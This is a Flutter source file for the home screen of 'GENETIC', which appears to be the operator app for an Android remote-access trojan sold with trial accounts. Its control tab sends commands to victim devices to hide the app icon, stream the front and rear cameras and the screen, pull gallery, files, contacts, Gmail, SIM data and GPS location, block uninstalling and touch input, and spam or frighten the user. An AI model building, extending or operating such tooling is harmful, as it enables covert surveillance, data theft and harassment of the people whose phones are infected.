import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:genetic_app/theme/app_theme.dart';
import 'package:genetic_app/services/auth_service.dart';
import 'package:genetic_app/services/socket_service.dart';
import 'package:genetic_app/models/device_model.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  int _currentTab = 0;
  DeviceModel? _selectedDevice;
  final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _initServices();
    });
  }

  Future<void> _initServices() async {
    final auth = context.read<AuthService>();
    final socket = context.read<SocketService>();
    await auth.loadUser();
    socket.connect(auth.api.baseUrl, auth.token ?? '');
  }

  void _selectDevice(DeviceModel device) {
    setState(() {
      _selectedDevice = device;
      _currentTab = 2; // Switch to KONTROL tab
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      key: _scaffoldKey,
      backgroundColor: AppTheme.bgDeepest,
      drawer: _buildDrawer(),
      body: SafeArea(
        child: IndexedStack(
          index: _currentTab,
          children: [
            _HomeTab(onDeviceTap: _selectDevice),
            _DevicesTab(onDeviceTap: _selectDevice),
            _KontrolTab(device: _selectedDevice),
          ],
        ),
      ),
      bottomNavigationBar: _buildBottomNav(),
      floatingActionButton: _buildFAB(),
    );
  }

  Widget _buildBottomNav() {
    return Container(
      decoration: BoxDecoration(
        color: AppTheme.bgDeepest.withOpacity(0.97),
        border: Border(
          top: BorderSide(color: AppTheme.glassBorder, width: 1),
        ),
        boxShadow: [
          BoxShadow(
            color: AppTheme.violet.withOpacity(0.05),
            blurRadius: 20,
            offset: const Offset(0, -4),
          ),
        ],
      ),
      child: BottomNavigationBar(
        currentIndex: _currentTab,
        onTap: (i) => setState(() => _currentTab = i),
        backgroundColor: Colors.transparent,
        elevation: 0,
        selectedItemColor: AppTheme.violet,
        unselectedItemColor: AppTheme.textMuted,
        type: BottomNavigationBarType.fixed,
        selectedLabelStyle:
            GoogleFonts.spaceMono(fontSize: 9, letterSpacing: 1.5),
        unselectedLabelStyle:
            GoogleFonts.spaceMono(fontSize: 9, letterSpacing: 1.5),
        items: const [
          BottomNavigationBarItem(
            icon: Icon(Icons.dashboard_outlined),
            activeIcon: Icon(Icons.dashboard),
            label: 'HOME',
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.phone_android_outlined),
            activeIcon: Icon(Icons.phone_android),
            label: 'DEVICES',
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.settings_remote_outlined),
            activeIcon: Icon(Icons.settings_remote),
            label: 'KONTROL',
          ),
        ],
      ),
    );
  }

  Widget _buildDrawer() {
    return Drawer(
      backgroundColor: AppTheme.bgDeep,
      child: SafeArea(
        child: Column(
          children: [
            const SizedBox(height: 24),
            // Drawer header
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              child: Row(
                children: [
                  Container(
                    width: 40,
                    height: 40,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: LinearGradient(
                        colors: [AppTheme.violet, AppTheme.fuchsia],
                      ),
                    ),
                    child: const Icon(Icons.code, color: Colors.white, size: 20),
                  ),
                  const SizedBox(width: 12),
                  Text(
                    'GENETIC',
                    style: TextStyle(
                      fontFamily: 'Genetic',
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                      color: AppTheme.textPrimary,
                      letterSpacing: 4,
                    ),
                  ),
                ],
              ),
            ),
            Divider(color: AppTheme.glassBorder, height: 1),
            const SizedBox(height: 8),

            _drawerItem(Icons.dashboard_outlined, 'Dashboard', () {
              Navigator.pop(context);
              setState(() => _currentTab = 0);
            }),
            _drawerItem(Icons.admin_panel_settings_outlined, 'Admin Panel', () {
              Navigator.pop(context);
              Navigator.pushNamed(context, '/admin');
            }),
            _drawerItem(Icons.settings_outlined, 'Settings', () {
              Navigator.pop(context);
              Navigator.pushNamed(context, '/settings');
            }),

            const Spacer(),
            Divider(color: AppTheme.glassBorder, height: 1),
            _drawerItem(Icons.logout, 'Logout', () async {
              Navigator.pop(context);
              final auth = context.read<AuthService>();
              await auth.logout();
              if (mounted) {
                Navigator.of(context).pushReplacementNamed('/login');
              }
            }, color: AppTheme.red),
            const SizedBox(height: 16),
          ],
        ),
      ),
    );
  }

  Widget _drawerItem(IconData icon, String label, VoidCallback onTap,
      {Color? color}) {
    return ListTile(
      leading: Icon(icon, color: color ?? AppTheme.textSecondary, size: 20),
      title: Text(
        label,
        style: GoogleFonts.outfit(
          fontSize: 14,
          color: color ?? AppTheme.textPrimary,
        ),
      ),
      onTap: onTap,
      dense: true,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      horizontalTitleGap: 8,
    );
  }

  Widget _buildFAB() {
    return FloatingActionButton(
      onPressed: () {
        showModalBottomSheet(
          context: context,
          backgroundColor: AppTheme.bgDeep,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
          ),
          builder: (_) => _buildQuickActions(),
        );
      },
      backgroundColor: AppTheme.violet.withOpacity(0.2),
      foregroundColor: AppTheme.violetLight,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: AppTheme.glassBorder2),
      ),
      child: const Icon(Icons.bolt, size: 24),
    );
  }

  Widget _buildQuickActions() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        border: Border(top: BorderSide(color: AppTheme.glassBorder2)),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Center(
            child: Container(
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                color: AppTheme.textMuted.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
          ),
          const SizedBox(height: 16),
          Text(
            'QUICK ACTIONS',
            style: GoogleFonts.spaceMono(
              fontSize: 10,
              letterSpacing: 2,
              color: AppTheme.textMuted,
            ),
          ),
          const SizedBox(height: 16),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              _quickAction(Icons.refresh, 'Refresh', () {
                Navigator.pop(context);
                _initServices();
              }),
              _quickAction(Icons.phone_android, 'Devices', () {
                Navigator.pop(context);
                setState(() => _currentTab = 1);
              }),
              _quickAction(Icons.settings, 'Settings', () {
                Navigator.pop(context);
                Navigator.pushNamed(context, '/settings');
              }),
              _quickAction(Icons.info_outline, 'About', () {
                Navigator.pop(context);
                Navigator.pushNamed(context, '/about');
              }),
            ],
          ),
          const SizedBox(height: 16),
        ],
      ),
    );
  }

  Widget _quickAction(IconData icon, String label, VoidCallback onTap) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(12),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: AppTheme.violetLight, size: 22),
            const SizedBox(height: 6),
            Text(
              label,
              style: GoogleFonts.spaceMono(
                fontSize: 8,
                letterSpacing: 1,
                color: AppTheme.textMuted,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// =============================================================================
// HOME TAB
// =============================================================================

class _HomeTab extends StatelessWidget {
  final ValueChanged<DeviceModel> onDeviceTap;

  const _HomeTab({required this.onDeviceTap});

  Future<void> _launchUrl(String url) async {
    final uri = Uri.parse(url);
    if (await canLaunchUrl(uri)) {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    }
  }

  @override
  Widget build(BuildContext context) {
    final auth = context.watch<AuthService>();
    final user = auth.user;

    return SingleChildScrollView(
      padding: const EdgeInsets.all(0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Banner
          _buildBanner(),

          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 16),

                // Connected badge
                _buildConnectedBadge(),

                const SizedBox(height: 16),

                // User info card
                _buildUserCard(user, auth),

                const SizedBox(height: 16),

                // Stats row
                _buildStatsRow(context, user, auth),

                const SizedBox(height: 20),

                // Social buttons
                _buildSocialButtons(),

                const SizedBox(height: 30),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBanner() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.fromLTRB(20, 50, 20, 24),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            AppTheme.bgLight,
            AppTheme.bgMid.withOpacity(0.8),
            AppTheme.bgDeepest,
          ],
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            'GENETIC',
            style: TextStyle(
              fontFamily: 'Genetic',
              fontSize: 28,
              fontWeight: FontWeight.w700,
              color: AppTheme.textPrimary,
              letterSpacing: 6,
              shadows: [
                Shadow(
                  color: AppTheme.violet.withOpacity(0.5),
                  blurRadius: 16,
                ),
              ],
            ),
          ),
          const SizedBox(height: 4),
          Text(
            'VERSION 3.0.0 CREATED BY SMOOTH',
            style: GoogleFonts.spaceMono(
              fontSize: 8,
              letterSpacing: 3,
              color: AppTheme.textMuted,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildConnectedBadge() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: AppTheme.green.withOpacity(0.08),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: AppTheme.green.withOpacity(0.2)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: AppTheme.green,
              boxShadow: [
                BoxShadow(
                  color: AppTheme.green.withOpacity(0.5),
                  blurRadius: 6,
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          Text(
            'CONNECTED',
            style: GoogleFonts.spaceMono(
              fontSize: 9,
              letterSpacing: 2,
              color: AppTheme.green,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildUserCard(dynamic user, AuthService auth) {
    final username = user?.username ?? 'Unknown';
    final role = user?.role ?? 'user';
    final trialExpiry = user?.trialExpiry;
    final isPermanent = trialExpiry == null;

    String trialText = 'Permanen';
    if (!isPermanent) {
      final diff = trialExpiry.difference(DateTime.now());
      if (diff.isNegative) {
        trialText = 'Expired';
      } else {
        trialText = '${diff.inDays}d ${diff.inHours % 24}h remaining';
      }
    }

    return Container(
      decoration: AppTheme.glassCard,
      padding: const EdgeInsets.all(20),
      child: Row(
        children: [
          // Avatar
          Container(
            width: 50,
            height: 50,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: LinearGradient(
                colors: [
                  AppTheme.violet.withOpacity(0.3),
                  AppTheme.fuchsia.withOpacity(0.15),
                ],
              ),
              border: Border.all(color: AppTheme.glassBorder2),
            ),
            child: Center(
              child: Text(
                username.isNotEmpty ? username[0].toUpperCase() : '?',
                style: GoogleFonts.rajdhani(
                  fontSize: 22,
                  fontWeight: FontWeight.w700,
                  color: AppTheme.violetLight,
                ),
              ),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  username,
                  style: GoogleFonts.rajdhani(
                    fontSize: 18,
                    fontWeight: FontWeight.w700,
                    color: AppTheme.textPrimary,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: AppTheme.roleColor(role).withOpacity(0.15),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(
                          color: AppTheme.roleColor(role).withOpacity(0.3),
                        ),
                      ),
                      child: Text(
                        role.toUpperCase(),
                        style: GoogleFonts.spaceMono(
                          fontSize: 8,
                          letterSpacing: 2,
                          color: AppTheme.roleColor(role),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Text(
                      trialText,
                      style: GoogleFonts.spaceMono(
                        fontSize: 9,
                        color: isPermanent ? AppTheme.green : AppTheme.amber,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatsRow(BuildContext context, dynamic user, AuthService auth) {
    final socket = context.watch<SocketService>();
    final role = user?.role ?? 'user';

    return Row(
      children: [
        Expanded(
          child: _statCard(
            'DEVICES',
            '${socket.devices.length}',
            Icons.phone_android,
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _statCard(
            'ROLE',
            role.toUpperCase(),
            Icons.shield_outlined,
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _statCard(
            'STATUS',
            'ONLINE',
            Icons.wifi,
            valueColor: AppTheme.green,
          ),
        ),
      ],
    );
  }

  Widget _statCard(String label, String value, IconData icon,
      {Color? valueColor}) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: AppTheme.glassCardSubtle,
      child: Column(
        children: [
          Icon(icon, color: AppTheme.textMuted, size: 18),
          const SizedBox(height: 8),
          Text(
            value,
            style: GoogleFonts.rajdhani(
              fontSize: 14,
              fontWeight: FontWeight.w700,
              color: valueColor ?? AppTheme.textPrimary,
              letterSpacing: 1,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 2),
          Text(
            label,
            style: GoogleFonts.spaceMono(
              fontSize: 7,
              letterSpacing: 2,
              color: AppTheme.textMuted,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSocialButtons() {
    return Row(
      children: [
        Expanded(
          child: InkWell(
            onTap: () => _launchUrl('https://t.me/ZenithIIX'),
            borderRadius: BorderRadius.circular(12),
            child: Container(
              height: 48,
              decoration: BoxDecoration(
                color: AppTheme.telegramBlue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border:
                    Border.all(color: AppTheme.telegramBlue.withOpacity(0.25)),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.send, color: AppTheme.telegramBlue, size: 16),
                  const SizedBox(width: 8),
                  Text(
                    'Telegram',
                    style: GoogleFonts.spaceMono(
                      fontSize: 10,
                      letterSpacing: 1,
                      color: AppTheme.telegramBlue,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: InkWell(
            onTap: () => _launchUrl('https://tiktok.com/@yudzx_01'),
            borderRadius: BorderRadius.circular(12),
            child: Container(
              height: 48,
              decoration: BoxDecoration(
                color: AppTheme.tiktokRed.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border:
                    Border.all(color: AppTheme.tiktokRed.withOpacity(0.25)),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.music_note, color: AppTheme.tiktokRed, size: 16),
                  const SizedBox(width: 8),
                  Text(
                    'TikTok',
                    style: GoogleFonts.spaceMono(
                      fontSize: 10,
                      letterSpacing: 1,
                      color: AppTheme.tiktokRed,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ],
    );
  }
}

// =============================================================================
// DEVICES TAB
// =============================================================================

class _DevicesTab extends StatelessWidget {
  final ValueChanged<DeviceModel> onDeviceTap;

  const _DevicesTab({required this.onDeviceTap});

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<SocketService>();
    final devices = socket.devices;

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        // Header
        Padding(
          padding: const EdgeInsets.fromLTRB(20, 16, 20, 12),
          child: Row(
            children: [
              Text(
                'DEVICES',
                style: TextStyle(
                  fontFamily: 'Genetic',
                  fontSize: 18,
                  fontWeight: FontWeight.w700,
                  color: AppTheme.textPrimary,
                  letterSpacing: 3,
                ),
              ),
              const Spacer(),
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: AppTheme.violet.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: AppTheme.glassBorder),
                ),
                child: Text(
                  '${devices.length}',
                  style: GoogleFonts.spaceMono(
                    fontSize: 10,
                    color: AppTheme.violetLight,
                  ),
                ),
              ),
            ],
          ),
        ),

        // Device list or empty state
        Expanded(
          child: devices.isEmpty ? _buildEmptyState() : _buildDeviceList(devices),
        ),
      ],
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            Icons.phone_android,
            color: AppTheme.textMuted.withOpacity(0.3),
            size: 64,
          ),
          const SizedBox(height: 16),
          Text(
            'No Devices',
            style: GoogleFonts.rajdhani(
              fontSize: 20,
              fontWeight: FontWeight.w700,
              color: AppTheme.textMuted,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            'Belom ada device...',
            style: GoogleFonts.outfit(
              fontSize: 13,
              color: AppTheme.textMuted.withOpacity(0.6),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceList(List<DeviceModel> devices) {
    return ListView.builder(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      itemCount: devices.length,
      itemBuilder: (context, index) {
        final device = devices[index];
        return _DeviceCard(device: device, onTap: () => onDeviceTap(device));
      },
    );
  }
}

class _DeviceCard extends StatelessWidget {
  final DeviceModel device;
  final VoidCallback onTap;

  const _DeviceCard({required this.device, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        margin: const EdgeInsets.only(bottom: 10),
        padding: const EdgeInsets.all(16),
        decoration: AppTheme.glassCardSubtle,
        child: Row(
          children: [
            // Phone icon
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: AppTheme.violet.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppTheme.glassBorder),
              ),
              child: const Icon(
                Icons.phone_android,
                color: AppTheme.violetLight,
                size: 20,
              ),
            ),
            const SizedBox(width: 14),

            // Info
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: Text(
                          device.name,
                          style: GoogleFonts.rajdhani(
                            fontSize: 15,
                            fontWeight: FontWeight.w700,
                            color: AppTheme.textPrimary,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                      // Online dot
                      Container(
                        width: 8,
                        height: 8,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: device.online ? AppTheme.green : AppTheme.red,
                          boxShadow: [
                            BoxShadow(
                              color: (device.online
                                      ? AppTheme.green
                                      : AppTheme.red)
                                  .withOpacity(0.5),
                              blurRadius: 6,
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 2),
                  Text(
                    device.deviceId,
                    style: GoogleFonts.spaceMono(
                      fontSize: 8,
                      letterSpacing: 1,
                      color: AppTheme.textMuted,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 6),
                  Row(
                    children: [
                      // Android version
                      Text(
                        'Android ${device.androidVersion}',
                        style: GoogleFonts.spaceMono(
                          fontSize: 8,
                          color: AppTheme.textMuted,
                        ),
                      ),
                      const Spacer(),
                      // Battery bar
                      _buildBatteryBar(),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildBatteryBar() {
    final pct = device.battery.clamp(0, 100);
    Color barColor;
    if (pct > 50) {
      barColor = AppTheme.green;
    } else if (pct > 20) {
      barColor = AppTheme.amber;
    } else {
      barColor = AppTheme.red;
    }

    return Row(
      mainAxisSize: MainAxisSize.min,
      children: [
        SizedBox(
          width: 40,
          height: 6,
          child: ClipRRect(
            borderRadius: BorderRadius.circular(3),
            child: LinearProgressIndicator(
              value: pct / 100,
              backgroundColor: AppTheme.bgLight,
              valueColor: AlwaysStoppedAnimation(barColor),
            ),
          ),
        ),
        const SizedBox(width: 4),
        Text(
          '$pct%',
          style: GoogleFonts.spaceMono(
            fontSize: 8,
            color: barColor,
          ),
        ),
      ],
    );
  }
}

// =============================================================================
// KONTROL TAB
// =============================================================================

class _KontrolTab extends StatelessWidget {
  final DeviceModel? device;

  const _KontrolTab({this.device});

  @override
  Widget build(BuildContext context) {
    if (device == null) {
      return _buildNoDevice();
    }
    return _buildControlPanel(context);
  }

  Widget _buildNoDevice() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            Icons.settings_remote_outlined,
            color: AppTheme.textMuted.withOpacity(0.3),
            size: 64,
          ),
          const SizedBox(height: 16),
          Text(
            'No Device Selected',
            style: GoogleFonts.rajdhani(
              fontSize: 20,
              fontWeight: FontWeight.w700,
              color: AppTheme.textMuted,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            'Pilih device dari tab Devices',
            style: GoogleFonts.outfit(
              fontSize: 13,
              color: AppTheme.textMuted.withOpacity(0.6),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlPanel(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Device header
          _buildDeviceHeader(),

          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 16),

                // UTAMA
                _buildSection(context, 'UTAMA', [
                  _ControlBtn(Icons.flashlight_on_outlined, 'Flashlight', 'flashlight'),
                  _ControlBtn(Icons.lock_outline, 'Lock Device', 'lock'),
                  _ControlBtn(Icons.visibility_off_outlined, 'Hide Icon', 'hideIcon'),
                  _ControlBtn(Icons.vibration, 'Vibrate', 'vibrate'),
                ]),

                const SizedBox(height: 16),

                // STREAMING
                _buildSection(context, 'STREAMING', [
                  _ControlBtn(Icons.camera_front, 'Camera Front', 'cameraFront'),
                  _ControlBtn(Icons.camera_rear, 'Camera Back', 'cameraBack'),
                  _ControlBtn(Icons.screen_share_outlined, 'Screen Stream', 'screenStream'),
                ]),

                const SizedBox(height: 16),

                // DATA
                _buildSection(context, 'DATA', [
                  _ControlBtn(Icons.photo_library_outlined, 'Gallery', 'gallery'),
                  _ControlBtn(Icons.folder_outlined, 'File Manager', 'fileManager'),
                  _ControlBtn(Icons.contacts_outlined, 'Contacts', 'contacts'),
                  _ControlBtn(Icons.mail_outline, 'Gmail', 'gmail'),
                  _ControlBtn(Icons.phone_outlined, 'Phone/SIM', 'phoneSim'),
                  _ControlBtn(Icons.location_on_outlined, 'GPS Location', 'gpsLocation'),
                ]),

                const SizedBox(height: 16),

                // AKSI
                _buildSection(context, 'AKSI', [
                  _ControlBtn(Icons.wallpaper, 'Set Wallpaper', 'setWallpaper'),
                  _ControlBtn(Icons.open_in_browser, 'Open URL', 'openUrl'),
                  _ControlBtn(Icons.play_circle_outline, 'Play Audio', 'playAudio'),
                  _ControlBtn(Icons.message_outlined, 'Toast Message', 'toast'),
                  _ControlBtn(Icons.warning_amber, 'Jumpscare V1', 'jumpscareV1'),
                  _ControlBtn(Icons.warning, 'Jumpscare V2', 'jumpscareV2'),
                ]),

                const SizedBox(height: 16),

                // ADVANCED
                _buildSection(context, 'ADVANCED', [
                  _ControlBtn(Icons.block, 'Block App', 'blockApp'),
                  _ControlBtn(Icons.delete_forever_outlined, 'Anti-Uninstall', 'antiUninstall'),
                  _ControlBtn(Icons.video_call_outlined, 'Video Overlay', 'videoOverlay'),
                  _ControlBtn(Icons.notifications_active_outlined, 'Spam Notif', 'spamNotif'),
                  _ControlBtn(Icons.touch_app_outlined, 'Touch Block', 'touchBlock'),
                  _ControlBtn(Icons.record_voice_over_outlined, 'TTS', 'tts'),
                  _ControlBtn(Icons.screenshot_outlined, 'Screenshot', 'screenshot'),
                  _ControlBtn(Icons.volume_off, 'Mute Volume', 'muteVolume'),
                ]),

                const SizedBox(height: 30),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceHeader() {
    final dev = device!;
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            AppTheme.bgLight,
            AppTheme.bgMid.withOpacity(0.6),
            AppTheme.bgDeepest,
          ],
        ),
      ),
      child: SafeArea(
        bottom: false,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Expanded(
                  child: Text(
                    dev.name,
                    style: GoogleFonts.rajdhani(
                      fontSize: 22,
                      fontWeight: FontWeight.w700,
                      color: AppTheme.textPrimary,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                // Online badge
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(
                    color: (dev.online ? AppTheme.green : AppTheme.red)
                        .withOpacity(0.1),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                      color: (dev.online ? AppTheme.green : AppTheme.red)
                          .withOpacity(0.3),
                    ),
                  ),
                  child: Text(
                    dev.online ? 'ONLINE' : 'OFFLINE',
                    style: GoogleFonts.spaceMono(
                      fontSize: 8,
                      letterSpacing: 2,
                      color: dev.online ? AppTheme.green : AppTheme.red,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 6),
            Row(
              children: [
                Text(
                  'Android ${dev.androidVersion}',
                  style: GoogleFonts.spaceMono(
                    fontSize: 9,
                    color: AppTheme.textMuted,
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  'Battery: ${dev.battery}%',
                  style: GoogleFonts.spaceMono(
                    fontSize: 9,
                    color: AppTheme.textMuted,
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  'SDK: ${dev.sdkVersion}',
                  style: GoogleFonts.spaceMono(
                    fontSize: 9,
                    color: AppTheme.textMuted,
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSection(
      BuildContext context, String title, List<_ControlBtn> buttons) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          title,
          style: GoogleFonts.spaceMono(
            fontSize: 9,
            letterSpacing: 3,
            color: AppTheme.textMuted,
          ),
        ),
        const SizedBox(height: 10),
        GridView.count(
          crossAxisCount: 4,
          shrinkWrap: true,
          physics: const NeverScrollableScrollPhysics(),
          mainAxisSpacing: 8,
          crossAxisSpacing: 8,
          childAspectRatio: 1.0,
          children: buttons.map((btn) {
            return _buildControlButton(context, btn);
          }).toList(),
        ),
      ],
    );
  }

  Widget _buildControlButton(BuildContext context, _ControlBtn btn) {
    return InkWell(
      onTap: () => _sendCommand(context, btn.command),
      borderRadius: BorderRadius.circular(14),
      child: Container(
        decoration: AppTheme.glassCardSubtle,
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(btn.icon, color: AppTheme.violetLight, size: 22),
            const SizedBox(height: 6),
            Text(
              btn.label,
              style: GoogleFonts.spaceMono(
                fontSize: 7,
                letterSpacing: 0.5,
                color: AppTheme.textSecondary,
              ),
              textAlign: TextAlign.center,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ],
        ),
      ),
    );
  }

  void _sendCommand(BuildContext context, String command) {
    if (device == null) return;
    final auth = context.read<AuthService>();
    auth.api.sendCommand(device!.deviceId, command, true);

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          'Command sent: $command',
          style: GoogleFonts.spaceMono(
            fontSize: 10,
            color: AppTheme.textPrimary,
          ),
        ),
        backgroundColor: AppTheme.bgMid,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10),
          side: BorderSide(color: AppTheme.green.withOpacity(0.3)),
        ),
        duration: const Duration(seconds: 1),
      ),
    );
  }
}

class _ControlBtn {
  final IconData icon;
  final String label;
  final String command;

  const _ControlBtn(this.icon, this.label, this.command);
}
